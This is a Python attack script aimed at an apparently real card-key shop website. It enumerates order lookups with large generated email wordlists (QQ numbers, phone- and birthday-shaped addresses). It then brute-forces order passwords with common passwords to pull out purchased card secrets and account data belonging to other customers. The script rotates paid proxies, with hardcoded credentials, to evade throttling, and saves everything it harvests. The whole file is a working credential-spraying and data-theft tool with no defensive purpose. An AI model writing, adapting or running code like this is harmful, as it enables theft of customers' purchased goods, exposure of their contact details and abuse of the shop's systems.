#!/usr/bin/env python3
"""太白 expanded email spray via jump+Qingguo — larger QQ/phone/birthday wordlists.

Prioritizes high-value patterns (repeats/AABB) then dense QQ ranges beyond MAX_N=9999.
"""
from __future__ import annotations

import json
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qq11388/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = os.environ.get("BASE") or "https://shopping.qq11399.vip"
WORKERS = int(os.environ.get("WORKERS") or "16")
QQ_START = int(os.environ.get("QQ_START") or "10000")
QQ_END = int(os.environ.get("QQ_END") or "200000")  # exclusive
SEVEN_START = int(os.environ.get("SEVEN_START") or "1000000")
SEVEN_END = int(os.environ.get("SEVEN_END") or "1050000")
QG_KEY = os.environ.get("QG_AUTHKEY") or "C413ED6D"
QG_PWD = os.environ.get("QG_AUTHPWD") or "344F550A6F8B"
RESUME = os.environ.get("RESUME", "1") != "0"
ALLOW_DIRECT = os.environ.get("ALLOW_DIRECT", "0") != "0"
DIRECT_SLOTS = int(os.environ.get("DIRECT_SLOTS") or "2")
PER_PROXY_COOLDOWN = float(os.environ.get("PER_PROXY_COOLDOWN") or "8")

lock = threading.Lock()
direct_sem = threading.Semaphore(DIRECT_SLOTS)
stats = {
    "done": 0,
    "hits": 0,
    "orders": 0,
    "kami": 0,
    "acc": 0,
    "errors": 0,
    "throttle": 0,
    "proxy_fail": 0,
    "direct": 0,
    "skipped": 0,
}
seen_tn, kami_tn = set(), set()
kami_rows, hit_orders, accounts = [], [], set()
done_kw = set()


class ProxyPool:
    def __init__(self):
        self._lock = threading.Lock()
        self._servers: list[str] = []
        self._deadlines: dict[str, float] = {}
        self._cooldown: dict[str, float] = {}
        self._bad: set[str] = set()
        self._idx = 0
        self._last_refresh = 0.0
        self._last_log_n = -1

    def _parse_deadline(self, s: str) -> float:
        try:
            # Qingguo deadline is China local time; run with TZ=Asia/Shanghai
            dt = datetime.strptime(s, "%Y-%m-%d %H:%M:%S")
            return dt.timestamp()
        except Exception:
            return time.time() + 60

    def refresh(self, force: bool = False) -> int:
        now = time.time()
        with self._lock:
            if not force and now - self._last_refresh < 12 and self._servers:
                return len(self._servers)
            self._last_refresh = now
        servers: list[str] = []
        deadlines: dict[str, float] = {}
        # Prefer fresh extract first (new exit IPs evade throttle)
        try:
            g = requests.get(
                f"https://share.proxy.qg.net/get?key={QG_KEY}&num={WORKERS}",
                timeout=12,
            ).json()
            for d in g.get("data") or []:
                srv = d.get("server")
                if not srv:
                    continue
                servers.append(srv)
                deadlines[srv] = self._parse_deadline(d.get("deadline") or "")
        except Exception as e:
            log("get_fail", e)
        # Reuse currently held channels
        try:
            q = requests.get(
                f"https://share.proxy.qg.net/query?key={QG_KEY}", timeout=12
            ).json()
            for d in q.get("data") or []:
                srv = d.get("server")
                if not srv:
                    continue
                servers.append(srv)
                deadlines[srv] = self._parse_deadline(d.get("deadline") or "")
        except Exception as e:
            log("query_fail", e)
        uniq = []
        seen = set()
        for s in servers:
            if s not in seen:
                seen.add(s)
                uniq.append(s)
        with self._lock:
            self._servers = uniq
            self._deadlines.update(deadlines)
            # only clear bad for freshly extracted deadlines still ahead
            fresh = {s for s, dl in deadlines.items() if dl - now > 20}
            self._bad -= fresh
            n_alive = len(
                [
                    s
                    for s in uniq
                    if s not in self._bad
                    and deadlines.get(s, now) - now > 8
                    and self._cooldown.get(s, 0) <= now
                ]
            )
            if n_alive != self._last_log_n or force:
                self._last_log_n = n_alive
                log("proxy_refresh", "n", len(uniq), "alive", n_alive, "workers", WORKERS)
        return len(uniq)

    def acquire(self) -> str | None:
        with self._lock:
            if not self._servers:
                return None
            now = time.time()
            alive = [
                s
                for s in self._servers
                if s not in self._bad
                and self._deadlines.get(s, now + 1) - now > 8
                and self._cooldown.get(s, 0) <= now
            ]
            if not alive:
                return None
            self._idx = (self._idx + 1) % len(alive)
            return alive[self._idx]

    def mark_bad(self, server: str | None, cooldown: bool = False):
        if not server or server == "direct":
            return
        with self._lock:
            if cooldown:
                self._cooldown[server] = time.time() + PER_PROXY_COOLDOWN
            else:
                self._bad.add(server)

    def proxies(self, server: str) -> dict:
        url = f"http://{QG_KEY}:{QG_PWD}@{server}"
        return {"http": url, "https": url}


POOL = ProxyPool()


def log(*a):
    print(*a, flush=True)


def save(persist_done: bool = False):
    (OUT / "expand_state.json").write_text(json.dumps(stats, ensure_ascii=False))
    (OUT / "contact_state.json").write_text(json.dumps(stats, ensure_ascii=False))
    (OUT / "contact_kami.json").write_text(
        json.dumps(kami_rows, ensure_ascii=False, indent=2)
    )
    (OUT / "contact_hits.json").write_text(
        json.dumps(hit_orders, ensure_ascii=False, indent=2)
    )
    (OUT / "contact_accounts.txt").write_text(
        "\n".join(sorted(accounts)) + ("\n" if accounts else "")
    )
    if persist_done:
        (OUT / "contact_done_kw.txt").write_text(
            "\n".join(sorted(done_kw)) + ("\n" if done_kw else "")
        )


def cards(secret):
    blob = str(secret or "").replace("<br/>", "\n").replace("<br>", "\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]


def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        return data.get("list") or []
    return []


PWS = [
    "",
    "123456",
    "000000",
    "123123",
    "111111",
    "12345678",
    "666666",
    "888888",
    "abcdef",
    "abc123",
    "112233",
    "123321",
    "654321",
    "5201314",
    "password",
    "qwerty",
    "qq123456",
    "147258",
    "aaaaaa",
    "woaini",
]


def _do_post(path: str, data: dict, proxies: dict | None):
    return requests.post(
        B + path,
        data=data,
        headers={
            "User-Agent": "Mozilla/5.0",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": B,
            "Referer": B + "/user/index/query",
        },
        proxies=proxies,
        verify=False,
        timeout=18,
    )


def post_json(path: str, data: dict, retries: int = 6):
    last_err = None
    for attempt in range(retries):
        prefer_direct = ALLOW_DIRECT and (
            attempt >= 3 or (attempt >= 1 and random.random() < 0.2)
        )
        held_direct = False
        server = None
        try:
            if prefer_direct and direct_sem.acquire(timeout=6):
                held_direct = True
                r = _do_post(path, data, None)
                with lock:
                    stats["direct"] += 1
                tag = "direct"
            else:
                server = POOL.acquire()
                if not server:
                    POOL.refresh(force=True)
                    server = POOL.acquire()
                if not server:
                    if ALLOW_DIRECT and direct_sem.acquire(timeout=5):
                        held_direct = True
                        r = _do_post(path, data, None)
                        with lock:
                            stats["direct"] += 1
                        tag = "direct"
                    else:
                        time.sleep(1.2)
                        continue
                else:
                    r = _do_post(path, data, POOL.proxies(server))
                    tag = server
            j = r.json()
            msg = str(j.get("msg") or "")
            if "频繁" in msg:
                with lock:
                    stats["throttle"] += 1
                if server:
                    POOL.mark_bad(server, cooldown=True)
                POOL.refresh()
                time.sleep(0.2 + random.random() * 0.3)
                continue
            return j, tag
        except Exception as e:
            last_err = e
            with lock:
                stats["proxy_fail"] += 1
            if server:
                POOL.mark_bad(server)
            if stats["proxy_fail"] % 10 == 1:
                POOL.refresh(force=True)
            time.sleep(0.15 + random.random() * 0.25)
        finally:
            if held_direct:
                direct_sem.release()
    return None, last_err


def fetch_secret(tn, kw):
    local = str(kw).split("@")[0]
    pws = [local, "123456", str(kw), local + "123", local + "456"] + PWS
    seen = set()
    for pw in pws:
        if pw in seen:
            continue
        seen.add(pw)
        for field in ("tradeNo", "orderId"):
            j, _ = post_json("/user/api/index/secret", {field: tn, "password": pw})
            if not j:
                continue
            if j.get("code") == 200 and j.get("data"):
                d = j["data"]
                return (d.get("secret") if isinstance(d, dict) else d), pw, field
            msg = str(j.get("msg") or "")
            if "还未支付" in msg:
                return None, None, None
            if "密码错误" in msg:
                break
    return None, None, None


def handle(kw, orders):
    with lock:
        stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if tn and tn not in seen_tn:
                seen_tn.add(tn)
                od = dict(od)
                od["_query_kw"] = kw
                hit_orders.append(od)
                stats["orders"] = len(seen_tn)
                save()
        if od.get("status") != 1 or not tn or tn in kami_tn:
            continue
        sec = od.get("secret")
        if sec and od.get("password") not in (True, 1, "1"):
            cs = cards(sec)
            row = {
                "trade_no": tn,
                "query_kw": kw,
                "password": None,
                "amount": od.get("amount"),
                "contact": od.get("contact"),
                "secret": sec,
                "cards": cs,
                "card_count": len(cs),
                "source": "query_list",
            }
            with lock:
                kami_rows.append(row)
                kami_tn.add(tn)
                stats["kami"] = len(kami_rows)
                for c in cs:
                    accounts.add(c)
                stats["acc"] = len(accounts)
                save()
            log("KAMI_LIST", tn, len(cs))
            continue
        secret, pw, field = fetch_secret(tn, od.get("contact") or kw)
        if not secret:
            continue
        cs = cards(secret)
        row = {
            "trade_no": tn,
            "query_kw": kw,
            "password": pw,
            "secret_field": field,
            "amount": od.get("amount"),
            "contact": od.get("contact"),
            "pay_time": od.get("pay_time"),
            "commodity_id": od.get("commodity_id"),
            "secret": secret,
            "cards": cs,
            "card_count": len(cs),
        }
        with lock:
            kami_rows.append(row)
            kami_tn.add(tn)
            stats["kami"] = len(kami_rows)
            for c in cs:
                accounts.add(c)
            stats["acc"] = len(accounts)
            save()
        log("KAMI", tn, "kw", kw, "pw", pw, "cards", len(cs), "amount", od.get("amount"))


def work(kw):
    kw = str(kw)
    if kw in done_kw:
        with lock:
            stats["skipped"] += 1
        return
    # retry keyword a few times before giving up (proxy churn)
    j = None
    for _ in range(3):
        j, _err = post_json("/user/api/index/query", {"keywords": kw})
        if j is not None:
            break
        time.sleep(0.5)
        POOL.refresh(force=True)
    if j is None:
        with lock:
            stats["errors"] += 1
            if stats["errors"] % 50 == 0:
                log("errors", stats)
                save()
        return
    orders = [x for x in extract(j) if isinstance(x, dict)]
    with lock:
        done_kw.add(kw)
        stats["done"] += 1
        if stats["done"] % 100 == 0:
            log("progress", stats, "kw", kw)
            save(persist_done=(stats["done"] % 2000 == 0))
            POOL.refresh()
    if orders:
        log(
            "HIT",
            kw,
            "n",
            len(orders),
            "paid",
            sum(1 for o in orders if o.get("status") == 1),
        )
        handle(kw, orders)


def wordlist():
    """Prioritized: pattern hits first (1111/6767-like), then dense QQ, phone, birthday."""
    words = []
    domains = [
        "qq.com",
        "163.com",
        "126.com",
        "foxmail.com",
        "gmail.com",
        "yeah.net",
        "139.com",
        "sina.com",
        "vip.qq.com",
        "outlook.com",
        "88.com",
    ]

    # 0) high-value 4-digit patterns (known hits: 1111, 6767, 5677, 996)
    pats = []
    for a in range(10):
        pats.append(f"{a}{a}{a}{a}")  # aaaa
        for b in range(10):
            if a == b:
                continue
            pats.append(f"{a}{a}{b}{b}")  # aabb
            pats.append(f"{a}{b}{a}{b}")  # abab
            pats.append(f"{a}{b}{b}{a}")  # abba
    for i in range(1000, 10000):
        s = f"{i:04d}"
        if s in pats or s[:2] == s[2:] or s[0] == s[1] == s[2] == s[3]:
            continue
        # sequential / keypad-ish later; keep dense 4-digit all for qq (cheap ROI)
    for p in pats:
        for d in ("qq.com", "163.com", "126.com", "foxmail.com"):
            words.append(f"{p}@{d}")
    # all remaining 4-digit @qq (hit-rich on this shop)
    for i in range(1000, 10000):
        words.append(f"{i}@qq.com")

    # 1) more weak locals
    weak = [
        "88888888",
        "66666666",
        "11111111",
        "123456789",
        "1234567890",
        "password",
        "qqq123",
        "vip888",
        "vip123",
        "taibai123",
        "tb123",
        "haohao",
        "lele",
        "qiqi",
        "nana",
        "baobao",
        "meimei",
        "gege",
        "xiaoxiao",
        "yuanyuan",
        "tingting",
        "huihui",
        "asdasd",
        "qwe123",
        "abc888",
        "gongzi",
        "maimai",
        "duoduo",
        "520520",
        "521521",
        "1314520",
        "7758521",
        "147258369",
    ]
    for loc in weak:
        for d in domains:
            words.append(f"{loc}@{d}")

    # 2) main QQ expansion beyond previous 1-9999
    for i in range(QQ_START, QQ_END):
        words.append(f"{i}@qq.com")
    # also 10000-50000 on 163/126 (smaller)
    for i in range(10000, min(QQ_END, 50000)):
        words.append(f"{i}@163.com")
        words.append(f"{i}@126.com")

    # 3) fill 1-9999 on extra domains (prev pass did qq + partial 163/126)
    for i in range(1, 10000):
        for d in ("foxmail.com", "yeah.net", "139.com", "vip.qq.com"):
            words.append(f"{i}@{d}")
        if i > 3000:
            words.append(f"{i}@163.com")
            words.append(f"{i}@126.com")

    # 4) birthday-ish
    for y in range(80, 106):
        for m in range(1, 13):
            for day in (1, 8, 10, 15, 18, 20, 25, 28):
                words.append(f"{y:02d}{m:02d}{day:02d}@qq.com")
                if y < 100:
                    words.append(f"19{y:02d}{m:02d}{day:02d}@qq.com")
                else:
                    words.append(f"20{y - 100:02d}{m:02d}{day:02d}@qq.com")

    # 5) phone-shaped
    for pre in [
        "130",
        "131",
        "132",
        "133",
        "135",
        "136",
        "137",
        "138",
        "139",
        "150",
        "151",
        "152",
        "155",
        "156",
        "157",
        "158",
        "159",
        "170",
        "171",
        "175",
        "176",
        "177",
        "178",
        "180",
        "181",
        "182",
        "183",
        "185",
        "186",
        "187",
        "188",
        "189",
        "190",
        "191",
        "198",
        "199",
    ]:
        for mid in [
            "0000",
            "0001",
            "0123",
            "1111",
            "1234",
            "2222",
            "5200",
            "5201",
            "6666",
            "8888",
            "9999",
            "2018",
            "2019",
            "2020",
            "2021",
            "2022",
            "2023",
            "2024",
            "2025",
            "2026",
        ]:
            for end in ["0000", "0001", "1111", "1234", "6666", "8888", "9999", "5200"]:
                words.append(f"{pre}{mid}{end}@qq.com")

    # 6) 7-digit sample
    for i in range(SEVEN_START, SEVEN_END):
        words.append(f"{i}@qq.com")

    seen, out = set(), []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out


def load_resume():
    global kami_rows, hit_orders, accounts, seen_tn, kami_tn, done_kw, stats
    st = OUT / "contact_state.json"
    if st.exists():
        try:
            old = json.loads(st.read_text())
            for k in ("done", "hits", "orders", "kami", "acc", "errors", "throttle"):
                if k in old:
                    stats[k] = old[k]
        except Exception:
            pass
    for path, bucket in (
        (OUT / "contact_kami.json", "kami"),
        (OUT / "contact_hits.json", "hits"),
    ):
        if not path.exists():
            continue
        try:
            rows = json.loads(path.read_text())
        except Exception:
            continue
        if bucket == "kami":
            kami_rows = rows
            for r in rows:
                tn = r.get("trade_no")
                if tn:
                    kami_tn.add(tn)
                    seen_tn.add(tn)
                for c in r.get("cards") or []:
                    accounts.add(c)
            stats["kami"] = len(kami_rows)
            stats["acc"] = len(accounts)
        else:
            hit_orders = rows
            for r in rows:
                tn = r.get("trade_no")
                if tn:
                    seen_tn.add(tn)
            stats["orders"] = len(seen_tn)
    dw = OUT / "contact_done_kw.txt"
    if dw.exists():
        done_kw.update(x.strip() for x in dw.read_text().splitlines() if x.strip())
    # also mark known hit query kws as done
    for r in hit_orders:
        kw = r.get("_query_kw") or r.get("contact")
        if kw:
            done_kw.add(str(kw))


def refresher():
    while True:
        time.sleep(18)
        try:
            POOL.refresh(force=True)
        except Exception as e:
            log("refresher_err", e)


def main():
    if RESUME:
        load_resume()
    # expand pass: keep kami/hits/done_kw, reset progress counters for this run
    stats["done"] = 0
    stats["skipped"] = 0
    stats["errors"] = 0
    stats["throttle"] = 0
    stats["proxy_fail"] = 0
    stats["direct"] = 0
    stats["hits"] = len({o.get("_query_kw") or o.get("contact") for o in hit_orders})
    stats["orders"] = len(seen_tn)
    stats["kami"] = len(kami_rows)
    stats["acc"] = len(accounts)
    n = POOL.refresh(force=True)
    if n < 1:
        raise SystemExit("no qingguo proxies available")
    words = wordlist()
    pending = [w for w in words if w not in done_kw]
    log(
        "words",
        len(words),
        "pending",
        len(pending),
        "workers",
        WORKERS,
        "qq_range",
        f"{QQ_START}-{QQ_END}",
        "seven",
        f"{SEVEN_START}-{SEVEN_END}",
        "proxies",
        n,
        "base",
        B,
        "resume_done_kw",
        len(done_kw),
        "kami",
        len(kami_rows),
    )
    threading.Thread(target=refresher, daemon=True).start()
    t0 = time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, pending, chunksize=16))
    save(persist_done=True)
    log("DONE", stats, "sec", int(time.time() - t0))


if __name__ == "__main__":
    main()
